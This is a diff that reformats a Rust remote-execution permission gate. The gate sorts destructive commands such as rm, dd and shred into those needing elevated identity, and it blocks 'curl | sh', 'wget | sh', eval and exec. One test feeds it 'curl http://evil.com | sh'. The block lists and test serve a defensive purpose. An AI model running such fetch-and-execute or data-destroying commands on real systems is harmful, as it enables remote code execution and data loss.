@@ -14,27 +14,16 @@ use super::rdp_session::SessionPermission;
 
 /// Dangerous commands that require elevated identity (E3+).
 const DESTRUCTIVE_COMMANDS: &[&str] = &[
-    "rm",
-    "rmdir",
-    "dd",
-    "mkfs",
-    "format",
-    "fdisk",
-    "parted",
-    "shred",
-    "wipefs",
-    "kill",
-    "killall",
-    "systemctl stop",
-    "systemctl disable",
-    "reboot",
-    "shutdown",
-    "halt",
-    "poweroff",
+    "rm", "rmdir", "dd", "mkfs", "format", "fdisk",
+    "parted", "shred", "wipefs", "kill", "killall",
+    "systemctl stop", "systemctl disable", "reboot",
+    "shutdown", "halt", "poweroff",
 ];
 
 /// Commands always blocked regardless of permission.
-const BLOCKED_COMMANDS: &[&str] = &["curl | sh", "wget | sh", "eval", "exec"];
+const BLOCKED_COMMANDS: &[&str] = &[
+    "curl | sh", "wget | sh", "eval", "exec",
+];
 
 /// Gate for remote command execution.
 pub struct RemoteExecGate {
@@ -94,10 +83,7 @@ impl RemoteExecGate {
         // Check consciousness.
         if phi < self.min_phi {
             return ExecPermission::Blocked {
-                reason: format!(
-                    "Consciousness {:.2} below threshold {:.2}",
-                    phi, self.min_phi
-                ),
+                reason: format!("Consciousness {:.2} below threshold {:.2}", phi, self.min_phi),
             };
         }
 
@@ -135,10 +121,7 @@ impl RemoteExecGate {
         for dangerous in DESTRUCTIVE_COMMANDS {
             if cmd_lower.starts_with(dangerous) || cmd_lower.contains(&format!(" {}", dangerous)) {
                 return ExecPermission::RequiresElevated {
-                    reason: format!(
-                        "'{}' is a destructive command, requires E3+ identity",
-                        dangerous
-                    ),
+                    reason: format!("'{}' is a destructive command, requires E3+ identity", dangerous),
                 };
             }
         }
@@ -225,8 +208,7 @@ mod tests {
     #[test]
     fn test_blocked_command() {
         let gate = RemoteExecGate::default();
-        let result =
-            gate.check_permission("curl http://evil.com | sh", SessionPermission::Full, 0.5);
+        let result = gate.check_permission("curl http://evil.com | sh", SessionPermission::Full, 0.5);
         assert!(matches!(result, ExecPermission::Blocked { .. }));
     }
 
@@ -262,9 +244,7 @@ mod tests {
         let gate = RemoteExecGate::default();
         let result = gate.execute("echo hello", None, None);
         match result {
-            RemoteExecMessage::Output {
-                stdout, exit_code, ..
-            } => {
+            RemoteExecMessage::Output { stdout, exit_code, .. } => {
                 assert!(stdout.contains("hello"));
                 assert_eq!(exit_code, Some(0));
             }
